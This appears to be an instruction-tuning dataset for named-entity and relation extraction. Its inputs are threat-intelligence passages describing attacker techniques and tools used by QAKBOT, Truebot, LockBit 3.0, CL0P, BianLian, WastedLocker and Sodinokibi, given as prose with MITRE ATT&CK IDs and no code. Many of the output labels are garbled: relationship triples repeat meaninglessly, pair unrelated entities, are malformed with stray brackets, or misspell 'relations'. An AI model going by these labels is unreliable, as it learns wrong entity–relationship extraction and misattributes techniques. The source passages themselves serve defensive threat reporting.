{"instruction": "Docker API request to get the docker version info using \u201cversion\u201d method 1010326 - Identified Docker Daemon Remote API Call Execution T1610 \u2013 Deploy Container Docker API request to create a container using \u201ccreate\u201d method 1010326 - Identified Docker Daemon Remote API Call Privilege Escalation T1611 - Escape to Host \u201cchroot\u201d to mount file system at \u201c/mnt\u201d directory The procedure was detected by Process Telemetry. Command and Control T1105 - Ingress Tool Transfer T1071.001 - Application Layer Protocol: Web Protocols \u201ccurl\u201d command is used to download the \u201ccronb.sh\u201d Procedure detected by Process Telemetry. Web reputation module also detects the download of \u201ccronb.sh\u201d Execution T1204002 - User Execution: Malicious File To harvest crypto currency \u201cxmrig\u201d coin miner is used Antimalware detects the malicious file. Discovery T1613 - Container and Resource Discovery T1046 - Network Service Discovery To move laterally in infrastructure the \u201cmasscan\u201d scanning tool is used", "input": null, "output": "Named Entities: (T1610, technique), (T1611, technique), (Process Telemetry, tool), (T1105, technique), (T1071.001, technique), (curl command, tool), (cronb.sh, file), (T1204, technique), (xmrig, tool), (Antimalware, tool), (T1613, technique), (T1046, technique), (masscan, tool)\nRelationships: (curl command, download, cronb.sh), (Process Telemetry, detect, cronb.sh)"}
{"instruction": "Tactics, Techniques, and Procedures (TTPs) Tactic / Technique Notes TA0001 Initial Access T1566.001 Phishing: Spear phishing Attachment Victims receive spear phishing emails with attached malicious zip files - typically password protected or HTML file. That file contains an ISO file. T1566.001 Phishing: Spear phishing Link QAKBOT has spread through emails with newly created malicious links. TA0002 Execution T1204.001 User Execution: Malicious Link QAKBOT has gained execution through users accessing malicious link T1204.002 User Execution: Malicious Link QAKBOT has gained execution through users opening malicious attachments T1569.002 System Services: Service Execution Cobalt Strike can use PsExec to execute a payload on a remote host. It can also use Service Control Manager to start new services T1059.005 Command and Scripting Interpreter: Visual Basic Script QAKBOT can use VBS to download and execute malicious files T1059.007 Command and Scripting Interpreter: JavaScript QAKBOT abuses Wscript to execute a Jscript file. TA0003 Persistence", "input": null, "output": "Named Entities: (TA0001, technique), (T1566.001, technique), (TA0002, technique), (T1204.001, technique), (T1204.002, technique), (T1569.002, technique), (T1059.005, technique), (T1059.007, technique), (QAKBOT, malware), (Cobalt Strike, tool), (PsExec, tool), (Service Control Manager, tool), (VBS, tool), (Wscript, tool), (Jscript, tool), (TA0003, technique)\nRelationships: (QAKBOT, use, TA0003), (QAKBOT, use, TA0003), (QAKBOT, use, TA0003), (QAKBOT, use, TA0003), (QAKBOT, use, TA0003), (QAKBOT, use, TA0003), (Cobalt Strike, use, PsExec), (Cobalt Strike, use, Service Control Manager), (QAKBOT, use, VBS), (QAKBOT, use, Wscript), (Wscript, execute, Jscript)"}
{"instruction": "T1135 Network Share Discovery QAKBOT can use net share to identify network shares for use in lateral movement. T1069.001 Permission Groups Discovery: Local Groups QAKBOT can use net localgroup to enable the discovery of local groups T1057 Process Discovery QAKBOT has the ability to check running processes T1018 Remote System Discovery QAKBOT can identify remote systems through the net view command T1082 System Information Discovery QAKBOT can collect system information including the OS version and domain on a compromised host T1016 System Network Configuration Discovery QAKBOT can use net config workstation, arp -a, and ipconfig /all to gather network configuration information T1049 System Network Connections Discovery QAKBOT can use netstat to enumerate current network connections T1033 System Owner/User Discovery QAKBOT can identify the username on a compromised system TA0008 Lateral Movement T1021 Remote Services: SMB/Windows Admin Shares Cobalt Strike can use Window admin shares (C$ and ADMIN$) for lateral movement", "input": null, "output": "Named Entities: (QAKBOT, malware), (T1135, technique), (T1069.001, technique), (T1057, technique), (T1018, technique), (T1082, technique), (T1016, technique), (T1049, technique), (T1033, technique), (TA0008, technique), (T1021, technique), (Cobalt Strike, tool), (Window admin shares, tool)\nRelationships: (QAKBOT, use, T1021), (QAKBOT, use, T1021), (QAKBOT, use, T1021), (QAKBOT, use, T1021), (QAKBOT, use, T1021), (QAKBOT, use, T1021), (QAKBOT, use, T1021), (QAKBOT, use, T1021), (QAKBOT, use, T1021), (T1021, use, T1021), (Cobalt Strike, use, Window admin shares)"}
{"instruction": "TA0011 Command and Control T1071.001 Application Layer Protocol: Web Protocols QAKBOT can use HTTP and HTTPS in communication with the C&C servers. T1573. Encrypted Channel Used by QAKBOT, BRUTEL and Cobalt Strike TA0040 Impact T1486. Data Encrypted for Impact Black Basta uses the ChaCha20 algorithm to encrypt files. The ChaCha20 encryption key is then encrypted with a public RSA-4096 key that is included in the executable. T1489. Service Stop Uses sc stop and taskkill to stop services. T1490. Inhibit System Recovery Black Basta deletes Volume Shadow Copies using vssadmin tool. T1491 - Defacement Replaces the desktop wallpaper to display the ransom note.", "input": null, "output": "Named Entities: (TA0011, technique), (T1071.001, technique), (QAKBOT, malware), (T1573, technique), (TA0040, technique), (T1486, technique), (Black Basta, malware), (T1489, technique), (T1490, technique), (vssadmin tool, tool), (T1491, technique)\nRelationships: (QAKBOT, use, T1491), (QAKBOT, use, T1491), (QAKBOT, use, T1491), (QAKBOT, use, T1491), (QAKBOT, use, T1491), (QAKBOT, use, T1491), (QAKBOT, use, T1491), (QAKBOT, use, T1491), (Black Basta, use, vssadmin tool)"}
{"instruction": "Following the initial checks for system information, Truebot has the capability to enumerate all running processes [T1057], collect sensitive local host data [T1005], and send this data to an encoded data string described below for second-stage execution. Based on IOCs in table 1, Truebot also has the ability to discover software security protocols and system time metrics, which aids in defense evasion, as well as enables synchronization with the compromised system\u2019s internal clock to facilitate scheduling tasks [T1518.001][T1124]. Next, it uses a .JSONIP extension, (e.g., IgtyXEQuCEvAM.JSONIP), to create a thirteen character globally unique identifier (GUID)\u2014a 128-bit text string that Truebot uses to label and organize the data it collects [T1036].", "input": null, "output": "Named Entities: (Truebot, malware), (T1057, technique), (T1005, technique), (T1518.001, technique), (T1124, technique), (IgtyXEQuCEvAM.JSONIP, file), (T1036, technique)\nRelationships: (Truebot, use, T1036), (Truebot, use, T1036), (Truebot, use, T1036), (Truebot, use, T1036), (Truebot, use, T1036)"}
{"instruction": "After creating the GUID, Truebot compiles and enumerates running process data into either a base64 or unique hexadecimal encoded string [T1027.001]. Truebot\u2019s main goal is identifying the presence of security debugger tools. However, the presence of identified debugger tools does not change Truebot\u2019s execution process\u2014the data is compiled into a base64 encoded string for tracking and defense evasion purposes [T1082][T1622]. Data Collection and Exfiltration Following Truebot\u2019s enumeration of running processes and tools, the affected system\u2019s computer and domain name [T1082][T1016], along with the newly generated GUID, are sent to a hard-coded URL in a POST request (as observed in the user-agent string). Note: A user-agent string is a customized HTTP request that includes specific device information required for interaction with web content. In this instance, cyber threat actors can redirect victims to malicious domains and further establish a C2 connection.", "input": null, "output": "Named Entities: (Truebot, malware), (T1027.001, technique), (T1082, technique), (T1622, technique), (cyber threat actors, attacker), (T1016, technique)\nRelationships: (Truebot, use, T1016), (Truebot, use, T1016), (Truebot, use, T1016), (Truebot, use, T1016)"}
{"instruction": "The POST request functions as means for establishing a C2 connection for bi-lateral communication. With this established connection, Truebot uses a second obfuscated domain to receive additional payloads [T1105], self-replicate across the environment [T1570], and/or delete files used in its operations [T1070.004]. Truebot malware has the capability to download additional malicious modules [T1105], load shell code [T1620], and deploy various tools to stealthily navigate an infected network. Associated Delivery Vectors and Tools Truebot has been observed in association with the following delivery vectors and tools: Raspberry Robin (Malware)", "input": null, "output": "Named Entities: (Truebot, malware), (T1105, technique), (T1570, technique), (T1070.004, technique), (T1620, technique), (Raspberry Robin, tool)\nRelationships: (Truebot, use, T1620), (Truebot, use, T1620), (Truebot, use, T1620), (Truebot, use, T1620)"}
{"instruction": "Cobalt Strike is a popular remote access tool (RAT) that cyber threat actors have leveraged\u2014in an observable manner\u2014for a variety of post-exploitation means. Typically a few hours after Truebot\u2019s execution phase, cyber threat actors have been observed deploying additional payloads containing Cobalt Strike beacons for persistence and data exfiltration purposes [T1059].[2] Cyber threat actors use Cobalt Strike to move laterally via remote service session hijacking [T1563.001][T1563.002], collecting valid credentials through LSASS memory credential dumping, or creating local admin accounts to achieve pass the hash alternate authentication [T1003.001][T1550.002]. Teleport (Tool)", "input": null, "output": "Named Entities: (Cobalt Strike, tool), (Truebot, malware), (T1059, technique), (T1563.001, technique), (T1563.002, technique), (T1003.001, technique), (T1550.002, technique), (Teleport, tool)\nRelationships: (Truebot, use, T1550.002), (Truebot, use, T1550.002), (Truebot, use, T1550.002), (Truebot, use, T1550.002), (Truebot, use, T1550.002)"}
{"instruction": "Table 4 shows a list of legitimate freeware and open-source tools LockBit affiliates have repurposed for ransomware operations. The legitimate freeware and open-source tools mentioned in this product are all publicly available and legal. The use of these tools by a threat actor should not be attributed to the freeware and open-source tools, absent specific articulable facts tending to show they are used at the direction or under the control of a threat actor. Table 4: Freeware and Open-Source Tools Used by LockBit Affiliates Tool Intended Use Repurposed Use by LockBit Affiliates MITRE ATT&CK ID 7-zip Compresses files into an archive. Compresses data to avoid detection before exfiltration. T1562 Impair Defenses AdFind Searches Active Directory (AD) and gathers information. Gathers AD information used to exploit a victim\u2019s network, escalate privileges, and facilitate lateral movement. S0552 AdFind Advanced Internet Protocol (IP) Scanner Performs network scans and shows network devices.", "input": null, "output": "Named Entities: (LockBit, attacker), (7-zip, tool), (T1562, technique), (AdFind, tool), (Advanced Internet Protocol (IP) Scanner, tool)\nRelationships: (LockBit, use, 7-zip), (LockBit, use, T1562), (LockBit, use, AdFind)"}
{"instruction": "Maps a victim\u2019s network to identify potential access vectors. T1046 Network Service Discovery Advanced Port Scanner Performs network scans. Finds open Transmission Control Protocol (TCP) and User Data Protocol (UDP) ports for exploitation. T1046 Network Service Discovery AdvancedRun Allows software to be run with different settings. Enables escalation of privileges by changing settings before running software. TA0004 Privilege Escalation AnyDesk Enables remote connections to network devices. Enables remote control of victim\u2019s network devices. T1219 Remote Access Software Atera Remote Monitoring & Management (RMM) Enables remote connections to network devices. Enables remote control of victim\u2019s network devices. T1219 Remote Access Software Backstab Terminates antimalware-protected processes. Terminates endpoint detection and response (EDR)- protected processes. T1562.001 Impair Defenses: Disable or Modify Tools Bat Armor Generates .bat files using PowerShell scripts. Bypasses PowerShell execution policy. T1562.001 Impair Defenses: Disable or Modify Tools Bloodhound Performs reconnaissance of AD for attack path management.", "input": null, "output": "Named Entities: (T1046, technique), (TA0004, technique), (AnyDesk, tool), (T1219, technique), (Atera Remote Monitoring & Management (RMM), tool), (Backstab, tool), (T1562.001, technique), (Bat Armor, tool), (Bloodhound, tool)\nRelationships: No related ralations."}
{"instruction": "Collection of Python classes for working with network protocols. Enables lateral movement on a victim\u2019s network. S0357 Impacket LaZagne Recovers system passwords across multiple platforms. Collect credentials for accessing a victim\u2019s systems and network. S0349 LaZagne Ligolo Establishes SOCKS5 or TCP tunnels from a reverse connection for pen testing. Enables connections to systems within the victim\u2019s network via reverse tunneling. T1095 Non-Application Layer Protocol LostMyPassword Recovers passwords from Windows systems. Obtains credentials for network access and exploitation. T1003 OS Credential Dumping MEGA Ltd MegaSync Facilitates cloud-based file synchronization. Facilitates cloud-based file synchronization for data exfiltration. T1567.002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Microsoft Sysinternals ProcDump Monitors applications for central processing unit (CPU) spikes and generates crash dumps during a spike. Obtains credentials by dumping the contents of Local Security Authority Subsystem Service (LSASS). T1003.001 OS Credential Dumping: LSASS Memory Microsoft Sysinternals PsExec", "input": null, "output": "Named Entities: (Impacket, tool), (LaZagne, tool), (Ligolo, tool), (LostMyPassword, tool), (MEGA Ltd, tool), (MegaSync, tool), (Microsoft Sysinternals ProcDump, tool), (Microsoft Sysinternals PsExec, tool), (T1095, technique), (T1003, technique), (T1567.002, technique), (T1003.001, technique)\nRelationships: (Ligolo, establish tunnels, T1003.001), (LostMyPassword, recover passwords, T1003.001), (MEGA Ltd, facilitate synchronization, T1003.001), (MegaSync, facilitate synchronization, T1003.001), (Microsoft Sysinternals ProcDump, monitor applications, T1003.001), (Microsoft Sysinternals ProcDump, obtain credentials, T1003.001), (Microsoft Sysinternals PsExec, obtain credentials, T1003.001)"}
{"instruction": "MITRE ATT&CK Tactics and Techniques Tables 5-16 show the LockBit affiliate tactics and techniques referenced in this advisory. Table 5: LockBit Affiliates\u2019 ATT&CK Techniques for Enterprise \u2013 Initial Access Technique Title ID Use Drive-by Compromise T1189 LockBit affiliates gain access to a system through a user visiting a website over the normal course of browsing. Exploit Public-Facing Application T1190 LockBit affiliates may exploit vulnerabilities (e.g., Log4Shell) in internet-facing systems to gain access to victims\u2019 systems. External Remote Services T1133 LockBit affiliates exploit RDP to gain access to victims\u2019 networks. Phishing T1566 LockBit affiliates use phishing and spearphishing to gain access to victims' networks. Valid Accounts T1078 LockBit affiliates obtain and abuse credentials of existing accounts as a means of gaining initial access. Table 6: LockBit Affiliates\u2019 ATT&CK Techniques for Enterprise \u2013 Execution Technique Title ID Use Execution TA0002 LockBit 3.0 launches commands during its execution.", "input": null, "output": "Named Entities: (LockBit affiliate, attacker), (T1189, technique), (T1190, technique), (T1133, technique), (T1566, technique), (T1078, technique), (TA0002, technique)\nRelationships: (LockBit affiliate, use, TA0002), (LockBit affiliate, use, TA0002), (LockBit affiliate, use, TA0002), (LockBit affiliate, use, TA0002), (LockBit affiliate, use, TA0002), (LockBit affiliate, use, TA0002)"}
{"instruction": "Command and Scripting Interpreter: Windows Command Shell T1059.003 LockBit affiliates use batch scripts to execute malicious commands. Software Deployment Tools T1072 LockBit affiliates may use Chocolatey, a command-line package manager for Windows. Technique Title ID Use System Services: Service Execution T1569.002 LockBit 3.0 uses PsExec to execute commands or payloads. Table 7: LockBit Affiliates\u2019 ATT&CK Techniques for Enterprise \u2013 Persistence Technique Title ID Use Boot or Logon Autostart Execution T1547 LockBit affiliates enables automatic logon for persistence. Valid Accounts T1078 LockBit affiliates may use a compromised user account to maintain persistence on the target network. Table 8: LockBit Affiliates\u2019 ATT&CK Techniques for Enterprise \u2013 Privilege Escalation Technique Title ID Use Privilege Escalation TA0004 LockBit affiliates will attempt to escalate to the required privileges if current account privileges are insufficient. Abuse Elevation Control Mechanism T1548", "input": null, "output": "Named Entities: (LockBit, malware), (T1059.003, technique), (T1072, technique), (Chocolatey, tool), (T1569.002, technique), (PsExec, tool), (T1547, technique), (T1078, technique), (TA0004, technique), (T1548, technique)\nRelationships: (LockBit, use, T1548), (LockBit, use, batch scripts), (LockBit, use, T1548), (LockBit, use, Chocolatey), (LockBit, use, T1548), (LockBit, use, PsExec), (LockBit, use, T1548), (LockBit, use, T1548), (LockBit, use, T1548), (LockBit, use, T1548)"}
{"instruction": "LockBit affiliates may use ucmDccwCOM Method in UACMe, a GitHub collection of User Account Control (UAC) bypass techniques. Boot or Logon Autostart Execution T1547 LockBit affiliates enable automatic logon for privilege escalation. Domain Policy Modification: Group Policy Modification T1484.001 LockBit affiliates may create Group Policy for lateral movement and can force group policy updates. Valid Accounts T1078 LockBit affiliates may use a compromised user account to escalate privileges on a victim\u2019s network. Table 9: LockBit Affiliates\u2019 ATT&CK Techniques for Enterprise \u2013 Defense Evasion Technique Title ID Use Execution Guardrails: Environmental Keying T1480.001 LockBit 3.0 will only decrypt the main component or continue to decrypt and/or decompress data if the correct password is entered. Impair Defenses: Disable or Modify Tools T1562.001 LockBit 3.0 affiliates use Backstab, Defender Control, GMER, PCHunter, PowerTool, Process Hacker or TDSSKiller to disable EDR processes and services.", "input": null, "output": "Named Entities: (LockBit, malware), (UACMe, tool), (T1547, technique), (T1484.001, technique), (T1078, technique), (T1480.001, technique), (T1562.001, technique), (Backstab, tool), (Defender Control, tool), (GMER, tool), (PCHunter, tool), (PowerTool, tool), (Process Hacker, tool), (TDSSKiller, tool)\nRelationships: (LockBit, use, T1562.001), (LockBit, use, T1562.001), (LockBit, use, T1562.001), (LockBit, use, T1562.001), (LockBit, use, T1562.001)"}
{"instruction": "LockBit 3.0 affiliates use Bat Armor to bypass the PowerShell execution Policy. LockBit affiliates may deploy a batch script, 123.bat, to disable and uninstall antivirus software. Lockbit 3.0 may modify and/or disable security tools including EDR and antivirus to avoid possible detection of malware, tools, and activities. Indicator Removal: Clear Windows Event Logs T1070.001 LockBit executable clears the Windows Event Logs files. Indicator Removal: File Deletion T1070.004 LockBit 3.0 will delete itself from the disk. Obfuscated Files or Information T1027 LockBit 3.0 will send encrypted host and bot information to its command and control (C2) servers. Obfuscated Files or Information: Software Packing T1027.002 LockBit affiliates may perform software packing or virtual machine software protection to conceal their code. Blister Loader has been used for such purpose. Table 10: LockBit Affiliates\u2019 ATT&CK Techniques for Enterprise \u2013 Credential Access Technique Title ID Use Brute Force T1110", "input": null, "output": "Named Entities: (LockBit 3.0, malware), (Bat Armor, tool), (123.bat, file), (T1070.001, technique), (T1070.004, technique), (T1027, technique), (T1027.002, technique), (T1110, technique), (Blister Loader, tool)\nRelationships: (LockBit 3.0, use, Bat Armor), (LockBit 3.0, deploy, 123.bat), (LockBit 3.0, modify, EDR), (LockBit 3.0, modify, antivirus), (LockBit 3.0, use, Blister Loader), (LockBit 3.0, use, T1110), (LockBit 3.0, use, T1110), (LockBit 3.0, use, T1110), (LockBit 3.0, use, T1110), (LockBit 3.0, use, T1110)"}
{"instruction": "LockBit affiliates may leverage VPN or RDP brute force credentials as an initial access. Credentials from Password Stores: Credentials from Web Browsers T1555.003 LockBit 3.0 actors use PasswordFox to recover passwords from Firefox Browser. OS Credential Dumping T1003 LockBit 3.0 actors use ExtPassword or LostMyPassword to recover passwords from Windows systems. OS Credential Dumping: LSASS Memory T1003.001 LockBit affiliates may use Microsoft Sysinternals ProDump to dump the contents of lsass.exe. LockBit affiliates have used Mimikatz to dump credentials. Table 11: LockBit Affiliates\u2019 ATT&CK Techniques for Enterprise \u2013 Discovery Technique Title ID Use Network Service Discovery T1046 LockBit affiliates use SoftPerfect Network Scanner, Advanced IP Scanner, or Advanced Port Scanner to scan target networks. LockBit affiliates may use SoftPerfect Network Scanner, Advanced Port Scanner, and AdFind to enumerate connected machines in the network. System Information Discovery T1082", "input": null, "output": "Named Entities: (LockBit, malware), (T1555.003, technique), (PasswordFox, tool), (T1003, technique), (ExtPassword, tool), (LostMyPassword, tool), (T1003.001, technique), (Microsoft Sysinternals ProDump, tool), (lsass.exe, file), (Mimikatz, tool), (SoftPerfect Network Scanner, tool), (Advanced IP Scanner, tool), (Advanced Port Scanner, tool), (AdFind, tool), (T1082, technique)\nRelationships: (LockBit, use, T1082), (LockBit, use, T1082), (LockBit, use, T1082), (LockBit, use, T1082)"}
{"instruction": "LockBit affiliates will enumerate system information to include hostname, host configuration, domain information, local drive configuration, remote shares, and mounted external storage devices. System Location Discovery: System Language Discovery T1614.001 LockBit 3.0 will not infect machines with language settings that match a defined exclusion list. Table 12: LockBit Affiliates\u2019 ATT&CK Techniques for Enterprise \u2013 Lateral Movement Technique Title ID Use Lateral Movement TA0008 LockBit affiliates will laterally move across networks and access domain controllers. Remote Services: Remote Desktop Protocol T1021.001 LockBit affiliates use Splashtop remote-desktop software to facilitate lateral movement. Remote Services: Server Message Block (SMB)/Admin Windows Shares T1021.002 LockBit affiliates may use Cobalt Strike and target SMB shares for lateral movement. Table 13: LockBit Affiliates\u2019 ATT&CK Techniques for Enterprise \u2013 Collection Technique Title ID Use Archive Collected Data: Archive via Utility T1560.001 LockBit affiliates may use 7-zip to compress and/or encrypt collected data prior to exfiltration.", "input": null, "output": "Named Entities: (LockBit, malware), (T1614.001, technique), (TA0008, technique), (T1021.001, technique), (T1021.002, technique), (Splashtop, tool), (Cobalt Strike, tool), (T1560.001, technique), (7-zip, tool)\nRelationships: (LockBit, use, T1560.001), (LockBit, use, Splashtop), (LockBit, use, Cobalt Strike), (LockBit, use, 7-zip), (LockBit, use, T1560.001), (LockBit, use, T1560.001), (LockBit, use, T1560.001), (LockBit, use, T1560.001)"}
{"instruction": "LockBit affiliates use publicly available file sharing services to exfiltrate a target\u2019s data. Exfiltration Over Web Service: Exfiltration to Cloud Storage T1567.002 LockBit affiliates use (1) Rclone, an open-source command line cloud storage manager or FreeFileSync to exfiltrate and (2) MEGA, a publicly available file sharing service for data exfiltration. Table 16: LockBit Affiliates\u2019 ATT&CK Techniques for Enterprise \u2013 Impact Technique Title ID Use Data Destruction T1485 LockBit 3.0 deletes log files and empties the recycle bin. Data Encrypted for Impact T1486 LockBit 3.0 encrypts data on target systems to interrupt availability to system and network resources. LockBit affiliates can encrypt Windows and Linux devices, as well as VMware instances. Defacement: Internal Defacement T1491.001 LockBit 3.0 changes the host system\u2019s wallpaper and icons to the LockBit 3.0 wallpaper and icons, respectively. Inhibit System Recovery T1490 LockBit 3.0 deletes volume shadow copies residing on disk. Service Stop T1489", "input": null, "output": "Named Entities: (LockBit, malware), (Rclone, tool), (FreeFileSync, tool), (MEGA, tool), (T1567.002, technique), (T1485, technique), (T1486, technique), (T1491.001, technique), (T1490, technique), (T1489, technique)\nRelationships: (LockBit, use, Rclone), (LockBit, use, FreeFileSync), (LockBit, use, MEGA), (LockBit, use, T1489), (LockBit, use, T1489), (LockBit, use, T1489), (LockBit, use, T1489), (LockBit, use, T1489), (LockBit, use, T1489)"}
{"instruction": "CVE-2023-34362 MOVEIT TRANSFER VULNERABILITY MOVEit is typically used to manage an organization\u2019s file transfer operations and has a web application that supports MySQL, Microsoft SQL Server, and Azure SQL database engines. In May 2023, the CL0P ransomware group exploited a SQL injection zero-day vulnerability CVE-2023-34362 to install a web shell named LEMURLOOT on MOVEit Transfer web applications [T1190] [1]. Lemurloot was used as a method of persistence, information gathering and data stealing in CVE-2023-34362. The webshell imports multiple libraries including \u201cMOVEit.DMZ.ClassLib,\u201d \u201cMOVEit.DMZ.Application.Files,\u201d and \u201cMOVEit.DMZ.Application.Users\u201d to interact with MOVEit managed file transfer software. The web shell was initially observed with the name human2.aspx in an effort to masquerade as the legitimate human.aspx file present as part of MOVEit Transfer software. Upon installation, the web shell creates a random 36 character password to be used for authentication.", "input": null, "output": "Named Entities: (CVE-2023-34362, vulnerability), (MOVEit, tool), (CL0P ransomware group, attacker), (SQL injection zero-day vulnerability, threat type), (LEMURLOOT, malware), (T1190, technique)\nRelationships: (CVE-2023-34362, exploited by, CL0P ransomware group), (CL0P ransomware group, install, LEMURLOOT), (LEMURLOOT, use, T1190)"}
{"instruction": "BianLian group actors search for sensitive files using PowerShell scripts (See Appendix: Windows PowerShell and Command Shell Activity) and exfiltrate them for data extortion. Prior to January 2023, BianLian actors encrypted files [T1486] after exfiltration for double extortion. BianLian group uses File Transfer Protocol (FTP) [T1048] and Rclone, a tool used to sync files to cloud storage, to exfiltrate data [T1537]. FBI observed BianLian group actors install Rclone and other files in generic and typically unchecked folders such as programdata\\vmware and music folders. ACSC observed BianLian group actors use Mega file-sharing service to exfiltrate victim data [T1567.002].", "input": null, "output": "Named Entities: (BianLian group, attacker), (PowerShell scripts, tool), (FTP, tool), (Rclone, tool), (T1486, technique), (T1048, technique), (T1537, technique), (Mega file-sharing service, tool), (T1567.002, technique)\nRelationships: (PowerShell scripts, used by, BianLian group), (BianLian group, use, FTP), (BianLian group, use, Rclone), (BianLian group, install, Rclone), (BianLian group, use, Mega file-sharing service), (BianLian group, use,T1486), T1567.002), (BianLian group, use,T1537), T1567.002)"}
{"instruction": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. Keylogging T1056.001 Adversaries may log user keystrokes to intercept credentials as the user types them. PowerShell T1059.001 Adversaries may abuse PowerShell commands and scripts for execution. Application Layer Protocol T1071 Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Web Protocols T1071.001 Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Mail Protocols T1071.003 Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. DNS T1071.004 Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Data Staged T1074", "input": null, "output": "Named Entities: (T1056.001, technique), (T1059.001, technique), (T1071, technique), (T1071.001, technique), (T1071.003, technique), (T1071.004, technique), (T1074, technique)\nRelationships: No related ralations."}
{"instruction": "PsExec is then used to launch PowerShell which uses the win32_service WMI class to retrieve services and the net stop command to stop these services. After Windows Defender is disabled and services have been stopped across the organization, PsExec is used to launch the WastedLocker ransomware itself, which then begins encrypting data and deleting shadow volumes. Figure 3. WastedLocker attack chain", "input": null, "output": "Named Entities: (PsExec, tool), (PowerShell, tool), (WastedLocker, malware), (Windows Defender, tool)\nRelationships: (PsExec, launch, PowerShell), (PsExec, launch, WastedLocker)"}
{"instruction": "Immediate threat to corporations \nThe attackers behind this threat appear to be skilled and experienced, capable of penetrating some of the most well protected corporations, stealing credentials, and moving with ease across their networks. As such, WastedLocker is a highly dangerous piece of ransomware. A successful attack could cripple the victim\u2019s network, leading to significant disruption to their operations and a costly clean-up operation.", "input": null, "output": "Named Entities: (WastedLocker, malware)\nRelationships: (attackers, use, WastedLocker)"}
{"instruction": "Sodinokibi: Ransomware Attackers also Scanning for PoS Software, Leveraging Cobalt Strike", "input": null, "output": "Named Entities: (Sodinokibi, malware), (Ransomware, threat type), (Cobalt Strike, tool)\nRelationships: (Sodinokibi, leveraging, Cobalt Strike)"}
{"instruction": "Organizations in the healthcare, services, and food sectors among victims. Researchers at Symantec, a division of Broadcom (NASDAQ: AVGO), have spotted a Sodinokibi targeted ransomware campaign in which the attackers are also scanning the networks of some victims for credit card or point of sale (PoS) software. It is not clear if the attackers are targeting this software for encryption or because they want to scrape this information as a way to make even more money from this attack.", "input": null, "output": "Named Entities: (Sodinokibi, malware)\nRelationships: No related relations."}
{"instruction": "The attackers are using the Cobalt Strike commodity malware to deliver the Sodinokibi targeted ransomware to victims. Eight organizations had the Cobalt Strike commodity malware on their systems, with three of the victims subsequently infected with the Sodinokibi ransomware. The victims infected with Sodinokibi were in the services, food, and healthcare sectors. The companies targeted in this campaign were primarily large, even multinational, companies, which were likely targeted because the attackers believed they would be willing to pay a large ransom to recover access to their systems. The attackers are aiming to make a lot of money - for victims infected with Sodinokibi the ransom requested is $50,000 in the Monero cryptocurrency if paid within the first three hours, and $100,000 after that.", "input": null, "output": "Named Entities: (Cobalt Strike, malware), (Sodinokibi, malware), (ransomware, threat type)\nRelationships: (Cobalt Strike, deliver, Sodinokibi)"}
{"instruction": "Tactics, tools, and procedures The attackers leverage legitimate tools in these attacks, and at one point we observed a legitimate remote admin client tool by NetSupport Ltd being used to install components during these attacks. In April, Symantec threat researchers found evidence of Sodinokibi attackers using similar tactics, when they spotted them using a copy of the AnyDesk remote access tool to deliver malware and other tools in at least two attacks. The attackers in this campaign also use \u2018legitimate\u2019 infrastructure to store their payload and for their command and control (C&C) server. The attackers are using code-hosting service Pastebin to host their payload (the Cobalt Strike malware and Sodinokibi) and are using Amazon\u2019s CloudFront service for their C&C infrastructure, to communicate with victim machines.", "input": null, "output": "Named Entities: (Sodinokibi, malware), (AnyDesk, tool), (Cobalt Strike, malware), (Pastebin, tool), (Amazon\u2019s CloudFront service, tool)\nRelationships: (Sodinokibi, used by, attackers), (AnyDesk, used by, attackers), (Cobalt Strike, hosted on, Pastebin), (Sodinokibi, hosted on, Pastebin)"}
{"instruction": "Pastebin and CloudFront are both legitimate services but have been observed being exploited by bad actors for similar malicious activity in the past. The advantage for malicious actors of using legitimate services to host payloads and for their C&C infrastructure is that traffic to and from a legitimate service is more likely to blend in with an organization\u2019s legitimate traffic, and so is less likely to be flagged as suspicious and blocked.", "input": null, "output": "No related entities and relations."}
{"instruction": "Cobalt Strike is an off-the-shelf tool that can be used to load shellcode onto victim machines; it has legitimate uses as a penetration testing tool but is frequently exploited by malicious actors. The tactics used in this series of attacks are similar to tactics seen used in other targeted ransomware attacks before. Microsoft released research in April into attacks by six ransomware gangs, including Sodinokibi, and said that many of the groups employ similar tactics. The vector for most attacks observed by Microsoft was either the exploitation of vulnerable network devices or brute-force attacks on Remote Desktop Protocol (RDP) servers, and initial intrusion was followed by the use of living-off-the-land and commodity tools to perform credential theft and lateral movement before deploying the ransomware payload on multiple computers. So the tactics employed in this attack campaign are tactics commonly used by targeted ransomware gangs.", "input": null, "output": "Named Entities: (Cobalt Strike, tool), (ransomware, threat type), (Sodinokibi, malware)\nRelationships: (Cobalt Strike, used to load, shellcode), (Cobalt Strike, used by, malicious actors)"}
{"instruction": "Once on a network, the attackers take various steps to reduce the chance they will be detected and to increase the chances of their attack working. The attackers attempt to disable any security software on the machine so their activity can\u2019t be detected. They also enable remote desktop connections so they can use them to launch malicious commands. The attackers also appear to be interested in stealing credentials on victim machines, and are observed adding user accounts, presumably in an attempt to maintain persistence on victim machines and also in a further attempt to keep a low profile on victim networks. We see the attackers using encoded PowerShell commands in some of these attacks. PowerShell is a Windows command line tool that has many legitimate purposes but is also frequently abused for nefarious purposes by malicious actors using living-off-the-land tactics.", "input": null, "output": "Named Entities: (attackers, attacker), (remote desktop connections, tool), (PowerShell commands, tool)\nRelationships: (attackers, attempt to disable, security software), (attackers, enable, remote desktop connections), (attackers, using, PowerShell commands)"}
{"instruction": "We see the Sodinokibi ransomware deployed on three of the victims that were infected with Cobalt Strike.", "input": null, "output": "Named Entities: (Sodinokibi, malware), (Cobalt Strike, malware), (ransomware, threat type)\nRelationships: No related relations."}
